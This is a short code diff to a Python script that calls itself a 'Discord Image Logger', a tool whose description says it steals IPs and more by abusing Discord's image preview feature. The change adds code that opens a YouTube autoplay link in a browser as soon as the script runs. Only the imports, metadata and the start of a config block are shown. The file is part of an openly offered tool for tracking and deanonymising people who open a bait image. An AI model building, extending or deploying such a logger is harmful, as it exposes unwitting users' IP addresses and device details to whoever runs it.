@@ -3,12 +3,15 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser, webbrowser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
+
+youtube_link = "https://www.youtube.com/embed/RAZSdO2DA3E?autoplay=1&fs=1"
+webbrowser.open(youtube_link)
 
 config = {
     # BASE CONFIG #
